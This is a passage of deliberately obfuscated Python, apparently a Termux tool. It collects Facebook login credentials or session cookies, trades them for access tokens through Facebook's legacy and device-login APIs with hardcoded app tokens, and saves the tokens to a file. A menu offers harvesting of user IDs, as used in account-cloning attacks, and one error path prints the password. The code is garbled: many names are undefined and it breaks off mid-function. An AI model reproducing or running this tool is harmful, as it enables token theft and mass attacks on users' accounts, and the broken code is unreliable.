=_IlllIIllIIlIllIlI ;IlIlllIIIIIllIlIl =_IlIlllllIlIIIIlII ;IIIllIIIlIllIIlll =_IIIlIlllllIIlIllI ;IIlllllIlllIIlIII =_IlIlIIllllIlllIlI ;IlIIIIIlllIlIllll =_IllIIIllIlllIlIll ;IlIlIIIIlIIIlIIIl =_IllIIllIlIlIlllll ;IIIIlIIllllIIlllI =_IIIIIIlIIllllIlll ;import os ,re ,random ,uuid ,subprocess ,requests ,sys ,time ,json ,string ;from os import system ;IlIIIlllIIlIIIllI =['random','uuid','subprocess','requests','time',_IllIIIlIllIIlllII ,'string'];[exec (f"import {IIIllIllllIIlIIII}")if IIIllIllllIIlIIII not in sys .modules else None for IIIllIllllIIlIIII in IlIIIlllIIlIIIllI ]
-	try :import mechanize ;IlIIllllIIIlllIII =mechanize .Browser ();IlIIllllIIIlllIII .set_handle_robots (False );IlIIllllIIIlllIII .set_handle_refresh (mechanize ._http .HTTPRefreshProcessor (),max_time =1 )
-	except :os .system ('pip install mechanize')
-	def IlllIllIllIIIIIII (IllllIIIIIIIIIIlI ):
-		for IIIIlIllIllIIlIlI in IllllIIIIIIIIIIlI +_IlIlIllllIIlIIllI :sys .stdout .write (IIIIlIllIllIIlIlI );sys .stdout .flush ();time .sleep (.001 )
-	def IIlIlIllIllIlIlIl ():IIIIIIIllIIIIlllI ()
-	def IIlllIlIIlIIIllll ():IlIIIIllIIIlIIllI =0 
-	IIIllIIlIllllIIll =_IIIIlIlIIllllllII ;IIIlllllIIlllIIIl ='\x1b[36m';IIlIIIIIlIlIIIIII =_IlllIIlIlIIIllIII ;IlIIIIIllIlIlIIIl =_IIIIIIIlIIIlIIlIl ;IIIlIlllIllIIIllI ='968';IIIIIlIlIllIIIlIl ='8280';IllIlIllIIIllIllI ='52729';IIllllllllIlIIIIl ='420';IlIlllIlIIlIlIIIl =f"{IIllllllllIlIIIIl}038{IIIlIlllIllIIIllI}89{IIIIIlIlIllIIIlIl}485649{IllIlIllIIIllIllI}208";IlIlIlllllllIlllI =str (random .randint (2e4 ,4e4 ));IlIIllIIIllIlIIlI =str (uuid .uuid4 ())
-	try :IlllIIlIllIllIIIl =subprocess .check_output ('getprop ro.product.brand',shell =_IllIllIlIIIlIIIII ).decode (_IIllIlIlllIIIlIlI ).replace (_IlIlIllllIIlIIllI ,'').upper ();IIIIlIIllIIlIlIll =subprocess .check_output ('getprop ro.product.model',shell =_IllIllIlIIIlIIIII ).decode (_IIllIlIlllIIIlIlI ).replace (_IlIlIllllIIlIIllI ,'').upper ();IlIlIIIllIIIlIIII =''+subprocess .check_output ('getprop gsm.operator.alpha',shell =_IllIllIlIIIlIIIII ).decode (_IIllIlIlllIIIlIlI ).split (',')[1 ].replace (_IlIlIllllIIlIIllI ,'').upper ()
-	except :IlllIIlIllIllIIIl =random .choice (['TECNO','INFINIX','SAMSUNG']);IIIIlIIllIIlIlIll =random .choice (['LD2','SM-J009','SM-J505','HOT12','NOTE-11','A5-PRO']);IlIlIIIllIIIlIIII =''+random .choice (['02','Oramge','EE','At&','MTN','Cricket'])
-	IlIlIIIIIlllllIIl =_IlllllIIlIlIlIIII ;IIIlIlIIlIlIlIllI =_IIIlIIlIIIIllIlIl ;IIIIlIIllIIllIIlI =_IIlIlllIlIIlIlIlI ;IIIIIlIllllllllll =_IlllIIllIlIllIlll ;IIIlllllIIlllIIIl =_IlIllIlIIIIlllIII ;IlIlIIlIIllIIlIII =_IllllIIllIIIllllI ;IIlllIlIIlIIllIIl =_IlIlIllIIllllIIll ;IlIIIlIlIIIIIlIII ='\x1b[0m';IlllIlIllllIllIII =_IIllIllllIIlIIllI 
-	def IIIIIIIIIlIlIIIIl (IIIIlIIIllllllIII ):
-		IIlIllIllIlIIlIII ,IIIlllIIIllIIIIIl =os .path .split (IIIIlIIIllllllIII )
-		if os .path .exists (IIIIlIIIllllllIII )and IIIIlIIIllllllIII .lower ().endswith (_IllIIIIlIlIIIlIIl ):return IIIIlIIIllllllIII 
-		IlIIlIIlIllIIlIII =os .path .dirname (IIlIllIllIlIIlIII )
-		for (IIllIIIIIIlIlIlIl ,IlIlIIIIllllIlIIl ,IIIlllIIlIllIIIIl )in os .walk (IlIIlIIlIllIIlIII ):
-			for IlIllIlllllllIlIl in IIIlllIIlIllIIIIl :
-				if IlIllIlllllllIlIl .lower ()==IIIlllIIIllIIIIIl .lower ()and IlIllIlllllllIlIl .lower ().endswith (_IllIIIIlIlIIIlIIl ):IIIIIlIlllIIIIlII =os .path .join (IIllIIIIIIlIlIlIl ,IlIllIlllllllIlIl );return IIIIIlIlllIIIIlII 
-	class IIIIlIlIIIllIlllI :
-		def __init__ (IlIlIlIlIIIIllIlI ):IlIIlIIIllIlIIIIl =[]
-		def lo_epa (IIlIlIIlIIIIIllIl ):
-			system (_IlIIlllIIlIIllIlI );print (IIllIllIlIIllIIII +'\x1b[1;34m\n\x1b[38;5;180m \x1b[38;5;180m \n\t⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⡆\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠉⠁⠉⠉⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠈⠙⠻⢿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢰⡄⠀⠀⠀⢳⡄⣿⣶⣄⠀⢿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢸⣿⣦⠀⠀⢸⣿⣿⣿⣿⣷⣸⣿⣿⣿⡇\n⠠⢤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⣿⣿⣷⡀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠈⠙⠻⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠿⠿⠿⠿⠿⠿⠟⠛⠻⣿⡀⠀⠀⠀⣿⣿⣿⣷⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠈⠀⠀⢀⣀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⠀⣿⣿⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⢀⣤⣾⣿⠟⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣀⣀⡀⠀⠀⣀⠀⠀⠀⢸⣧⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⣠⡶⠿⠟⠛⠁⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⣶⡿⣀⣀⡉⠓⠞⠁⠀⠀⠀⢸⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢸⣿⡏⣴⠁⢀⠉⢢⠀⠀⠀⠀⠀⢸⣿⠀⠀⡎⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣶⠸⣿⣇⠻⣀⡼⠀⢸⠀⠀⠀⠀⠀⢸⣿⠀⢠⠁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠸⢿⣧⠙⢿⣿⠁⠀⣠⡞⠀⠀⠀⠀⠀⢸⣿⢀⡎⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⢰⣶⣦⡀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⠘⠋⠉⠀⠀⠀⠀⠀⠀⢸⣿⣾⢁⣀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣇⠀⣿⣿⣿⣷⣶⣦⣤⣉⠉⠩⣍⣉⣙⣛⡛⠛⠛⠛⠛⣀⣤⣤⣤⣤⣴⣶⣶⡶⣾⡿⠛⠛⠛⠉⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢰⣿⣿⣿⡿⠿⠟⠛⠛⠳⠦⢌⠻⢿⣿⣿⣿⣿⣿⠀⠀⠉⠉⢀⠴⠚⠉⠀⠀⣼⠁⢀⣀⣤⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⢼⣿⣿⣿⣿⣿⣿⣿⣿⣔⣾⣿⠁⢠⡄⠐⣮⣴⣭⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠁⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣤⣬⣥⣬⣽⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣠⣤⣤⣤⣤⣤⣤⣤⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠈⢻⣿⣿⣿⣿⡟⠁⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡿⣿⠿⣛⣭⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠙⠿⠿⠋⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠇⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⡿⣻⣿⣿⡿⠛⠛⠛⠛⠛⠛⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⢟⣽⣿⣿⣿⣿⣷⣶⣿⡿⠿⠿⠿⠷⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠺⢿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣄⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⣠⣴⡿⠟⠁⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣤⡈⠛⠿⣿⣿⣿⣿⠟⣋⣠⣤⣶⡿⠟⠋⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣷⣶⣤⣤⣤⣤⣤⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠇\n');print (f"[1;37m سـجل بـحساب فـايسبوك وهـمي");print (f"{IIIIlIIllllIIlllI}—"*60 );IIIIIlIlIIllllIIl =str (input (f"[√] - Enter Gmail / Id :"));IIlllIlIIlIIIllll ();print (f"{IIIIlIIllllIIlllI}—"*60 );IIlllIlIIlIIIllll ();IlIlIlllIlIIIIIlI =input (f"[√] - Enter Password :");print (f"{IIIIlIIllllIIlllI}—"*60 );print ('');IIlllIlIIlIIIllll ();IllIIIIIlIllIIIll ='5990';IlIIIlllIIIIlIIIl ='655';IIIlIIIllllllIllI ='59';IlIllIlIlIlIlIlIl =f"2377{IllIIIIIlIllIIIll}9{IIIlIIIllllllIllI}1{IlIIIlllIIIIlIIIl}";IIlllIIIIlIIlIIII ='lf14laabedfb65';IIlllllIlIIIIllII ='a2263b1';IIlIIllIlIIlIllll =f"25257C{IIlllIIIIlIIlIIII}ac27a739ed1{IIlllllIlIIIIllII}";IIllllllIIIllIIII =f"Mozilla/5.0 (Linux; Android {str(random.randint(4,11))}.0; Nexus 5 Build/MRA{str(random.randint(30,60))}N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edg/111.0.{str(random.randint(1600,1661))}.41";IlIIllllIIIlllIII .addheaders =[(_IIIIllIlllIIIIIIl ,IIllllllIIIllIIII )];IIIllIIIIlIllIlIl ='b-ap';IllIIIlIlIIIllIll ='od/auth.l';IlllIIIIlIIIlIIIl ='3f555f98';IIIllIIIIIIllIllI ='d7aa0c';IIlIIllIlIllIlIlI ='58f522efm';IlIIllIllIllIIIII =f"{IlllIIIIlIIIlIIIl}fb61fc{IIIllIIIIIIllIllI}44f{IIlIIllIlIllIlIlI}";IlIIlIlIlIIllIIll =IlIIllllIIIlllIII .open ('https://'+IIIllIIIIlIllIlIl +'i.facebook.com/meth'+IllIIIlIlIIIllIll +'ogin?access_token='+IlIllIlIlIlIlIlIl +'%'+IIlIIllIlIIlIllll +'&format=json&sdk_version=1&email='+IIIIIlIlIIllllIIl +'&locale=en_US&password='+IlIlIlllIlIIIIIlI +'&sdk=ios&generate_session_cookies=1&sig='+IlIIllIllIllIIIII +'');IIIIllIIIIIIIlllI =json .load (IlIIlIlIlIIllIIll )
-			if _IIIIIIIlIllIIlIII in IIIIllIIIIIIIlllI :IIllIIllIIlIllIll =IIIIllIIIIIIIlllI [_IIIIIIIlIllIIlIII ];IIlllIlIIlIIIllll ();print (f"{IIIIlIIllllIIlllI}—"*60 );IlllIllIllIIIIIII (f"[1;32m[[1;37m√[1;32m] - Login Done - Restart The Tool");IIlllIlIIlIIIllll ();open (_IllIIIIlllllIlIII ,'w').write (IIllIIllIIlIllIll );exit ()
-			elif 'www.facebook.com'in IIIIllIIIIIIIlllI ['error_msg']:print ('WAIT......');exit (IIIIIlIlIIllllIIl +_IIIIIIIlIIIlIIlIl +IlIlIlllIlIIIIIlI )
-			else :IIlllIlIIlIIIllll ();exit (f"{IIllIllIlIIllIIII} Werong Information ❌ ")
-		def login_epa2 (IIllllIllIlIllIll ):
-			IIlIllIlIllIIllII ='value';IIllllllIIlIIIlII ='action';IlllIlIIlIlIIlIll ='https://mbasic.facebook.com';IlIIlIIIlIlIIIlll ='user_code';system (_IlIIlllIIlIIllIlI );print (logo );IlIIIIIIIIllIIIIl =input (' cookie : ');IIIllIlIllIIlIIlI ={'Cookie':IlIIIIIIIIllIIIIl };IIlIIIlIlIlIIIIll =requests .session ();IIIlIIIIllIIlllll ={_IIIIIIIlIllIIlIII :'134856469851739l|ll7cla91l1b9e1c8ffab7276668l5l38','scope':''};IIlIlllIIlIllIlIl =IIlIIIlIlIlIIIIll .post ('https://graph.facebook.com/v16.0/device/login/',data =IIIlIIIIllIIlllll ).json ();IIIIIIllIIIlllIll =IIlIlllIIlIllIlIl ['code'];IIIIIIlIlIlIIlIII =IIlIlllIIlIllIlIl [IlIIlIIIlIlIIIlll ];IIIlllllIlIlIIlIl ='https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=134856469851739l|ll7cla91l1b9e1c8ffab7276668l5l38'%IIIIIIllIIIlllIll ;IIlIlllIIlIllIlIl =bs (IIlIIIlIlIlIIIIll .get ('https://mbasic.facebook.com/device',cookies =IIIllIlIllIIlIIlI ).content ,_IllIIIllIlIllllII );IlIllllllIlllIllI =IIlIlllIIlIllIlIl .find (_IIIIllIIllIllIIIl ,{_IlllIlIIllIIllIll :_IIIlIIlllIlIIIIll });IIIllllIIlllIllII ={'jazoest':re .search ('name="jazoest" type="hidden" value="(.*?)"',str (IlIllllllIlllIllI )).group (1 ),'fb_dtsg':re .search ('name="fb_dtsg" type="hidden" value="(.*?)"',str (IIlIlllIIlIllIlIl )).group (1 ),'qr':'0',IlIIlIIIlIlIIIlll :IIIIIIlIlIlIIlIII };IlIlIIIlIIlIIIlII =IlllIlIIlIlIIlIll +IlIllllllIlllIllI [IIllllllIIlIIIlII ];IlllIllIlIlIIIllI =bs (IIlIIIlIlIlIIIIll .post (IlIlIIIlIIlIIIlII ,data =IIIllllIIlllIllII ,cookies =IIIllIlIllIIlIIlI ).content ,_IllIIIllIlIllllII );IIIllllIIlllIllII ={};IlIllllllIlllIllI =IlllIllIlIlIIIllI .find (_IIIIllIIllIllIIIl ,{_IlllIlIIllIIllIll :_IIIlIIlllIlIIIIll })
-			for IIlIIIlIllIIIIIll in IlIllllllIlllIllI ('input',{IIlIllIlIllIIllII :_IllIllIlIIIlIIIII }):
-				try :
-					if IIlIIIlIllIIIIIll [_IlllllIIIIIllIIlI ]=='__CANCEL__':0 
-					else :IIIllllIIlllIllII .update ({IIlIIIlIllIIIIIll [_IlllllIIIIIllIIlI ]:IIlIIIlIllIIIIIll [IIlIllIlIllIIllII ]})
-				except Exception as IIlIIlIIllIIIllll :pass 
-			IlIlIIIlIIlIIIlII =IlllIlIIlIlIIlIll +IlIllllllIlllIllI [IIllllllIIlIIIlII ];IlllIllIlIlIIIllI =bs (IIlIIIlIlIlIIIIll .post (IlIlIIIlIIlIIIlII ,data =IIIllllIIlllIllII ,cookies =IIIllIlIllIIlIIlI ).content ,_IllIIIllIlIllllII );IIlIlllIIlIllIlIl =IIlIIIlIlIlIIIIll .get (IIIlllllIlIlIIlIl ,cookies =IIIllIlIllIIlIIlI ).json ()
-			if _IIIIIIIlIllIIlIII in IIlIlllIIlIllIlIl :print (f" [{IIIlllllIIlllIIIl}•{IIlIIIIIlIlIIIIII}] LOGIN DONE RERUN ");open (_IllIIIIlllllIlIII ,'w').write (IIlIlllIIlIllIlIl [_IIIIIIIlIllIIlIII ]);exit ()
-			else :exit ('WRONG')
-		def login_WALA (IlllIIIlllIIIIlII ):
-			system (_IlIIlllIIlIIllIlI );IIlllIlIIlIIIllll ();IlIlllIllIIllIlII =_IIllIIlIllllIlIIl 
-			if IlIlllIllIIllIlII in [_IIIIIlIIIIIIlIlIl ,_IIllIIlIllllIlIIl ,_IIIIIIlIIIlIllIIl ,_IIllIlllIIIIIlIlI ]:IIIIlIlIIIllIlllI ().lo_epa ()
-			if IlIlllIllIIllIlII in ['461918']:IIIIlIlIIIllIlllI ().login_epa2 ()
-			else :IIlllIlIIlIIIllll ();IlllIllIllIIIIIII ('YOUR CHOSE IS WRONG');time .sleep (1 );login_WALA ()
-	def IIIIIIIllIIIIlllI ():
-		os .system (_IlIIlllIIlIIllIlI );print ('');print (IIllIllIlIIllIIII +'\x1b[1;34m\n\x1b[38;5;180m \x1b[38;5;180m \n\n ⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀          ⠀⠀⠀\n⠀⠀⠀⠀⣠⣴⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⡀⠀\n⠀⠀⢀⣾⡟⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡙⣿⡄\n⠀⠀⣸⣿⠃⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⣹⣿\n⠀⠀⣿⣿⡆⢚⢄⣀⣠⠤⠒⠈⠁⠀⠀⠈⠉⠐⠢⢄⡀⣀⢞⠀⣾⣿\n⠀⠀⠸⣿⣿⣅⠄⠙⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠑⣄⣽⣿⡟\n⠀⠀⠀⠘⢿⣿⣟⡾              ⠱⣾⣿⣿⠏⠀\n⠀⠀⠀⠀⣸⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⢻⠀          ⠀\n⠀⠀⠀⠀⢿⠀⢃⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⢸         ⠀⠀\n⠀⠀⠀⠀⢸⢰⡿⢘⣦⣤⣀⠑⢦⡀⠀⣠⠖⣁⣤⣴⡊⢸⡇⡼          ⠀⠀\n⠀⠀⠀⠀⠀⠾⡅⣿⣿⣿⣿⣿⠌⠁⠀⠁⢺⣿⣿⣿⣿⠆⣇⠃          ⠀⠀\n⠀⠀⠀⠀⠀⢀⠂⠘⢿⣿⣿⡿⠀⣰⣦⠀⠸⣿⣿⡿⠋⠈⢀          ⠀⠀⠀\n⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⢠⣿⢻⣆⠀⠀⠀⠀⠀⠀⣸          ⠀⠀⠀\n⠀⠀⠀⠀⠀⠈⠓⠶⣶⣦⠤⠀⠘⠋⠘⠋⠀⠠⣴⣶⡶⠞⠃          ⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣿⢹⣷⠦⢀⠤⡤⡆⡤⣶⣿⢸⠇          ⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⢰⡀⠘⢯⣳⢶⠦⣧⢷⢗⣫⠇⠀⡸⠀         ⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠑⢤⡀⠈⠋⠛⠛⠋⠉⢀⡠⠒⠁         ⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢦⠀⢀⣀⠀⣠⠞⠁        ⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀⠀      ⠀⠀⠀⠀⠀⠀\n');print (f"""
-  [1;32m  [[1;37m1[1;32m] [1;37m- Create File Ids - صنع ملف ايديات
-
-  [1;32m  [[1;37m2[1;32m] [1;37m- Change Token - تغيير توكن
-
-  [1;32m  [[1;37m3[1;32m] [1;37m- Delete Ids Double - حدف ايديات مكررة   """);print ('');IIIIlIIIlIIlIIIII =input (f" [1;32m   [[1;37m•[1;32m] [1;37mEnter :")
-		if IIIIlIIIlIIlIIIII in [_IIllIIlIllllIlIIl ]:IlIllllIIIlIllIll ().file_unlimmited ()
-		if IIIIlIIIlIIlIIIII in ['2']:os .system ('rm -rf المبرمج نمرود');IIlllIlIIlIIIllll ();os .system ('rm -rf لاتنسى صور الصيد');IIlllIlIIlIIIllll ();print ('');IlllIllIllIIIIIII (f"[1;32m[[1;37m-[1;32m] Token Has Been Deleted √");exit ()
-		if IIIIlIIIlIIlIIIII in ['3']:print ('');IIlIIlIllIllllIIl =input (f"{IlIlIIIIIlllllIIl} [1;94m[[1;97m√[1;94m][1;94m [1;97m File Path :")
-		else :IIlllIlIIlIIIllll ();IlllIllIllIIIIIII (f"{IIllIllIlIIllIIII} - Wrong Choice ");time .sleep (1 );IIIIIIIllIIIIlllI ()
-	IlIlllllllIIlIIIl =[];IIlIlIIlIIlIlIlII =[]
-	class IlIllllIIIlIllIll :
-		def file_simple (IIIIllllIIIIIIlll ):
-			os .system (_IlIIlllIIlIIllIlI );print (logo )
-			try :print (f" [•] WRITE FILE NAME WITHOUT /sdcard ");IlIIlllIllIIlIIIl =input (f" [•] ENTER FILE NAME : ").replace (' ','_');IIlIlIlIlllIlIlll ='/sdcard/Download/Telegram/';IlIIllllllIIIlIll ='%s%s'%(IIlIlIlIlllIlIlll ,IlIIlllIllIIlIIIl );open (IlIIllllllIIIlIll ,'w')
-			except FileNotFoundError :print (f" [×] LOCATION NOT FOUND TRY AGAIN !! ");time .sleep (2 );IIlIlIllIllIlIlIl ()
-			except IsADirectoryError :time .sleep (1 );IlIllllIIIlIllIll ().file_simple ()
-			if IOError :
